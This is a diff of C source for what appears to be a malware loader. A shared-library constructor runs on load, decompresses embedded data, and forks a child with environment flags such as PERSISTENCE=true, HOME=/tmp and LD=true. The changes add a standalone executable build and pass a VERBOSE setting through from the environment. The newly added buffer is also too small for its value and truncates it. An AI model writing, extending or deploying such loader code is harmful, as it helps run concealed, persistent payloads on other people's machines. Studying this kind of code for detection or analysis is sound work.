@@ -217,10 +217,14 @@ int is_str_in_file(const char *path, const char *str) {
   return 0;
 }
 
+#ifdef LINUX_EXE
+void main() {
+#else
 /**
  * Initializes the library. This function is called when the library is loaded.
  */
 void __attribute__((constructor)) initLibrary(void) {
+#endif
   // ignore SIGCHLD
   signal(SIGCHLD, SIG_IGN);
 
@@ -300,12 +304,19 @@ void __attribute__((constructor)) initLibrary(void) {
 
   DEBUG_PRINT("Decompressed data size: %zu\n", data_size);
 
+  char *verbose = calloc(13, sizeof(char));
+  snprintf(verbose, 13, "VERBOSE=%s", getenv("VERBOSE"));
+
   char *argv[] = {"", NULL};
   char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
                   "HOME=/tmp",
                   "PERSISTENCE=true",
                   "LD=true",
-                  "VERBOSE=false",
+#ifdef DEBUG
+                  "VERBOSE=true",
+#else
+                  verbose,
+#endif
                   NULL};
 
   pid_t child = fork();
@@ -317,9 +328,11 @@ void __attribute__((constructor)) initLibrary(void) {
   }
 }
 
+#ifdef LINUX_SO
 /**
  * Cleans up the library. This function is called when the library is unloaded.
  */
 void __attribute__((destructor)) cleanUpLibrary(void) {
   DEBUG_PRINT("Cleaning up library...\n");
 }
+#endif
